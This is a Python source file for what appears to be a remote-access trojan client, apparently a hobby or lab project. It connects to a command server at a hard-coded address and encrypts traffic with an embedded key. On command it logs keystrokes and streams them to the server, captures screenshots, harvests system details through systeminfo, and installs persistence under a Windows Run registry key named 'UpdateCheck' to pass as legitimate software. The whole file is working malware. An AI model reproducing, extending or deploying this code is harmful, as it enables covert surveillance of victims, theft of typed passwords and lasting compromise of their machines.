try:
    import socket
    import keyboard as kb
    from cryptography.fernet import Fernet
    import winreg as reg
    from time import sleep
    from sys import executable
    from PIL import ImageGrab
    import pickle
    import platform
    import subprocess
    import re
except ModuleNotFoundError:
    exit() # Silent exit

def keylog(event, conn, key):
    key_name = event.name
    if key_name in ["shift", "ctrl", "alt", "caps lock", "esc", "tab", "insert", "delete", "home", "end", "page up", "page down", "left", "right", "up", "down"]:
        pass
    elif key_name == "space":
        key_name = "[space]"
    elif key_name == "enter":
        key_name = "[new_line]"
    else:
        conn.sendall(encrypt_message(key_name.encode(), key))

def server_connect(ip_address, port):
    while True:
        print("Connecting to server . . .")
        s_conn = socket.socket()
        try:
            s_conn.connect((ip_address, port))
            return s_conn
        except Exception:
            print("[!] Connection failed. Retrying connection . . .")
            sleep(5)

def encrypt_message(data, key):
    if not isinstance(data, bytes):
        data = pickle.dumps(data)
    try:        
        encMessage = key.encrypt(data)
    except:
        encMessage = "" # Default Value
    
    return encMessage

def decrypt_server_message(encyrpted_message, key):
    try:
        decMessage = key.decrypt(encyrpted_message).decode() 
    except:
        decMessage = "" # Default Value

    return decMessage  

def create_persistence():
    platform_info = system_information()
    
    if "Windows" not in platform_info[1]:
        return "not_windows"
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    script_path = executable # Dynamically get current executable path of script

    try: # Checking if registry key exists
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_READ)
        reg.QueryValueEx(key, "UpdateCheck")
        reg.CloseKey(key) 
        
        return "already_created"
    except FileNotFoundError: # Registry key does not exist
        try:
            key = reg.CreateKeyEx(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE)
            reg.SetValueEx(key, "UpdateCheck", 0, reg.REG_SZ, script_path)
            reg.CloseKey(key)
            
            return "created"
        except:
            return "fail"
    except:
        return "fail"

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_data = pickle.dumps(screenshot)

    return screenshot_data

def system_information():
    OS_platform = platform.platform().lower()
    if "windows" not in OS_platform:
        return "not_windows"
    
    try:
        system_info_output = subprocess.run(["systeminfo"], capture_output=True, text=True).stdout
    except:
        return "no_information"
    
    output = []
    patterns = {
        'Hostname': r"Host Name:\s+([^\r\n]+)",
        'OS Name': r"OS Name:\s+([^\r\n]+)",
        'OS Version': r"OS Version:\s+([^\r\n]+)",
        'OS Manufacturer': r"OS Manufacturer:\s+([^\r\n]+)",
        'Registered Owner': r"Registered Owner:\s+([^\r\n]+)",
        'Registered Organization': r"Registered Organization:\s+([^\r\n]+)",
        'System Manufacturer': r"System Manufacturer:\s+([^\r\n]+)",
        'System Directory': r"System Directory:\s+([^\r\n]+)",
        'Domain': r"Domain:\s+([^\r\n]+)",
        'Logon Server': r"Logon Server:\s+\\\\([^\r\n]+)",
        'IP Address': r"IP address\(es\)\s+[^:]+:\s+([0-9]{1,3}(?:\.[0-9]{1,3}){3})",
        'MAC Address': r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"
    }

    for key, value in patterns.items():
        system_output = re.search(value, system_info_output, re.MULTILINE)
        if system_output:
            output.append(f"{key}: {system_output.group(1)}")
        else:
            output.append(f"No information found for {key}")
    
    if not isinstance(output,list):
        return "no_information"
    else:
        return output      
    
# Required variables
ip_address, port = "127.0.0.1", 5555
static_key = Fernet(b'3OSmBSCGoSIjSa5eZ1DEM4MW92p8ESIUr4wSn0sz9zE=')

s_conn = server_connect(ip_address, port)
print("[+] Connected to server, Try hack me!") # Debug message, to delete 

while True:
    data = decrypt_server_message(s_conn.recv(1024), static_key)
    if not data:
        pass
    elif data == "kill":
        break
    
    if data == "keylog_start":
        kb.on_press(lambda event: keylog(event, s_conn, static_key), suppress=True)
        kb.wait('esc')
    elif data == "persist":
        persistance_output = create_persistence()
        s_conn.sendall(encrypt_message(persistance_output, static_key))
    elif data == "screenshot":
        encrypted_screenshot_data = encrypt_message(take_screenshot(), static_key)
        s_conn.sendall(len(encrypted_screenshot_data).to_bytes(8, 'big'))
        s_conn.sendall(encrypted_screenshot_data)  
    elif data == "sys_info":
        system_info = system_information()
        s_conn.sendall(encrypt_message(system_info, static_key))

print("[+] Connection ended with server") # Debug message, to delete 
s_conn.close()